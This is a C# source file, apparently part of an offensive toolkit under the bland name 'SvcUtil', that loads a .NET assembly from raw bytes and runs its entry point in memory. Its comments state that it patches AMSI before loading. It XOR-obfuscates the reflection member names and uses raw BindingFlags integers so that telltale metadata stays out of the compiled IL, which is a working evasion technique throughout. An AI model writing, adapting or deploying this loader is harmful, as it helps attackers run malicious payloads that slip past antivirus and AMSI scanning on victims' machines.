using System;
using System.IO;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    /// <summary>
    /// Command-line .NET assembly execution.
    /// Loads a .NET assembly from raw bytes (via staging or base64),
    /// runs its EntryPoint, and writes captured Console output to stdout.
    ///
    /// Uses Type.InvokeMember with raw BindingFlags integers to avoid
    /// MethodInfo/PropertyInfo/ParameterInfo TypeRefs in IL metadata.
    /// </summary>
    internal static class AsmExec
    {
        // ── String decode ───────────────────────────────────────────
        private static readonly byte[] _xk = { 0xB7, 0x4E, 0xF3, 0x28, 0x9D };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // "System.Reflection.Assembly"
        private static readonly byte[] _tAsm =
            { 0xE4, 0x37, 0x80, 0x5C, 0xF8, 0xDA, 0x60, 0xA1,
              0x4D, 0xFB, 0xDB, 0x2B, 0x90, 0x5C, 0xF4, 0xD8,
              0x20, 0xDD, 0x69, 0xEE, 0xC4, 0x2B, 0x9E, 0x4A,
              0xF1, 0xCE };

        // "Load"
        private static readonly byte[] _mLoad =
            { 0xFB, 0x21, 0x92, 0x4C };

        // "EntryPoint"
        private static readonly byte[] _pEp =
            { 0xF2, 0x20, 0x87, 0x5A, 0xE4, 0xE7, 0x21, 0x9A,
              0x46, 0xE9 };

        // "GetParameters"
        private static readonly byte[] _mGp =
            { 0xF0, 0x2B, 0x87, 0x78, 0xFC, 0xC5, 0x2F, 0x9E,
              0x4D, 0xE9, 0xD2, 0x3C, 0x80 };

        // "Invoke"
        private static readonly byte[] _mInv =
            { 0xFE, 0x20, 0x85, 0x47, 0xF6, 0xD2 };

        // BindingFlags as raw integers — no enum TypeRef in metadata
        // InvokeMethod(256) | Public(16) | Static(8)
        private const int BfInvStatic = 280;
        // GetProperty(4096) | Public(16) | Instance(4)
        private const int BfGetProp = 4116;
        // InvokeMethod(256) | Public(16) | Instance(4)
        private const int BfInvInst = 276;

        // ── Public API ──────────────────────────────────────────────

        /// <summary>
        /// Load and execute a .NET assembly from raw bytes.
        /// Patches AMSI before loading. Captures Console output
        /// and writes it to the real stdout.
        /// </summary>
        /// <param name="assemblyBytes">Raw .NET assembly bytes.</param>
        /// <param name="args">
        /// Arguments to pass to the assembly's Main method.
        /// </param>
        /// <returns>True if execution completed, false on error.</returns>
        public static bool Run(byte[] assemblyBytes, string[] args)
        {
            // AMSI bypass before Assembly.Load
            Ctx.Run();

            Exception runError = null;
            string capturedOutput = null;

            var runner = new Thread(() =>
            {
                var origOut = Console.Out;
                var origErr = Console.Error;
                var capture = new StringWriter();

                try
                {
                    Console.SetOut(capture);
                    Console.SetError(capture);

                    // All operations via Type.InvokeMember — no
                    // MethodInfo, PropertyInfo, ParameterInfo in IL
                    Type t = Type.GetType(D(_tAsm));

                    // Assembly.Load(byte[])
                    object loaded = t.InvokeMember(
                        D(_mLoad),
                        (System.Reflection.BindingFlags)BfInvStatic,
                        null, null,
                        new object[] { assemblyBytes });

                    // Assembly.EntryPoint (get property)
                    object ep = t.InvokeMember(
                        D(_pEp),
                        (System.Reflection.BindingFlags)BfGetProp,
                        null, loaded, null);

                    if (ep == null)
                    {
                        runError = new InvalidOperationException(
                            "No valid entry found");
                        return;
                    }

                    // ep.GetParameters()
                    Array parms = (Array)ep.GetType().InvokeMember(
                        D(_mGp),
                        (System.Reflection.BindingFlags)BfInvInst,
                        null, ep, null);

                    object[] invokeArgs;
                    if (parms.Length == 0)
                        invokeArgs = null;
                    else
                        invokeArgs = new object[] { args };

                    // ep.Invoke(null, args)
                    ep.GetType().InvokeMember(
                        D(_mInv),
                        (System.Reflection.BindingFlags)BfInvInst,
                        null, ep,
                        new object[] { null, invokeArgs });
                }
                catch (Exception ex)
                {
                    runError = ex.InnerException ?? ex;
                }
                finally
                {
                    Console.SetOut(origOut);
                    Console.SetError(origErr);
                    capturedOutput = capture.ToString();
                }
            });

            runner.IsBackground = true;
            runner.Start();
            runner.Join(300000); // 5 minute timeout

            if (!string.IsNullOrEmpty(capturedOutput))
                Console.Write(capturedOutput);

            if (runError != null)
                return false;

            return !runner.IsAlive;
        }
    }
}
